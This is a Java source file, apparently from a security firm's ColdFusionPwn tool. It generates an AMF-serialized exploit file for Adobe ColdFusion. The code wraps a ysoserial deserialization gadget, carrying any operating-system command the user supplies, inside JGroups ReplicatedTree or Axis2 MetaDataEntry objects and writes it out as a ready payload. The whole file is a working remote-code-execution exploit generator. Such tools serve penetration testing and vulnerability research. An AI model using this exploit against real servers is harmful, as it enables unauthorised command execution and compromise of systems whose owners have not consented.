package com.codewhitesec.coldfusionpwn;

import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.ActionMessage;
import flex.messaging.io.amf.AmfMessageSerializer;
import flex.messaging.io.amf.AmfTrace;
import flex.messaging.io.amf.MessageBody;
import org.apache.axis2.util.MetaDataEntry;
import org.jgroups.blocks.ReplicatedTree;
import ysoserial.payloads.ObjectPayload;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.Serializable;

public class ColdFusionPwner {

    public static void main(String[] args) throws Exception {


        if(args.length != 4){
            printUsage();
            System.exit(-1);
        }

        Object payload = null;
        String method = args[0].trim();

        Serializable gadget = genYsoSerialPayload(args[1],args[2]);

        if(method.equals("-s")){

            payload = new ReplicatedTree(gadget);

        }else if(method.equals("-e")){

            payload = new MetaDataEntry(gadget);

        }else{
            printUsage();
            System.exit(-1);
        }

        genExploit(payload,args[3]);

    }

    private static void printUsage() {

        System.err.println("Usage: java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:/path/to/ysoserial-master-SNAPSHOT-all.jar [-s|-e] [payload type] '[command to execute]' [outfile]");

    }

    public static Serializable genYsoSerialPayload(String payloadType, String command) throws Exception {

        Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);

        ObjectPayload payload = (ObjectPayload)payloadClass.newInstance();
        Object object = payload.getObject(command);

        return (Serializable) object;
    }


    public static void genExploit(Object payload,String file) throws IOException {

        FileOutputStream fout = new FileOutputStream(file);
        SerializationContext context = new SerializationContext();
        AmfTrace trace = new AmfTrace();

        AmfMessageSerializer seri = new AmfMessageSerializer();
        seri.initialize(context, fout, trace);

        ActionMessage message = new ActionMessage(3);
        MessageBody body = new MessageBody();
        body.setData(payload);
        message.addBody(body);

        seri.writeMessage(message);

    }

}
